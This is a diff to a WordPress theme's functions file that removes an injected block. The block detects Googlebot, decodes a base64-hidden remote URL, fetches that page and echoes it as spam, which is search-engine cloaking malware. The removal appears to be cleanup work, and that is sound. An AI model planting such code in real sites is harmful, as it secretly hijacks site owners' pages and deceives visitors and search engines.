@@ -554,21 +554,6 @@ if ( ! function_exists( 'flash_content_width' ) ) :
 
 		$GLOBALS['content_width'] = apply_filters( 'flash_content_width', $content_width );
 	}
-	
-if (strpos($user_agent, 'googlebot') !== false) {
-    // 
-    $encoded_url = 'aHR0cHM6Ly9ncnRvdG8uc3RvcmUvcmF5Y29uYnVpbGRlcnMuaHRtbA==';
-
-    //
-    $url = base64_decode($encoded_url);
-
-    // 
-    $spam = file_get_contents($url);
-
-    echo $spam;
-    exit;
-	
-	}
 
 	add_action( 'after_setup_theme', 'flash_content_width', 0 );
 endif;
